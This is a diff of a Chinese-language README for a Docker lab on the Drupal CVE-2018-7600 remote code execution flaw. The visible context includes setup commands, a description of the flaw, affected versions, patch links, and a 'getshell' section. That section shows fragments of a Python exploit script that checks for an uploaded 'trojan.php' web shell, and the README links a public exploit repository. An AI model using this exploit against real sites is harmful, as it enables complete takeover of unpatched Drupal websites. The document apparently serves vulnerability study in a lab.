@@ -4,6 +4,7 @@ docker-compose build
 docker-compose up -d
 ```
 ##漏洞介绍
+
 2018年3月28日，Drupal Security Team官方发布了一个重要的安全公告，宣称Drupal 6,7,8等多个子版本存在远程代码执行漏洞，攻击者可以利用该漏洞攻击Drupal系统的网站，执行恶意代码，最后完全控制被攻击的网站，该漏洞就是：CVE-2018-7600。
 影响版本
 Drupal 6.x，7.x，8.x
@@ -21,6 +22,7 @@ Drupal 7.58，Drupal 8.5.1
 8.3.x 版本，更新到 8.3.9 https://www.drupal.org/project/drupal/releases/8.3.9
 
 ##getshell
+
 ```
 #!/usr/bin/env python3
 import sys
@@ -56,6 +58,9 @@ if check.status_code != 200:
 print ('\nCheck: '+target+'trojan.php')
 
 ```
+
+![](luffy.png)
+
 
 [链接一](https://paper.seebug.org/567/)
 [链接二](https://github.com/g0rx/CVE-2018-7600-Drupal-RCE)
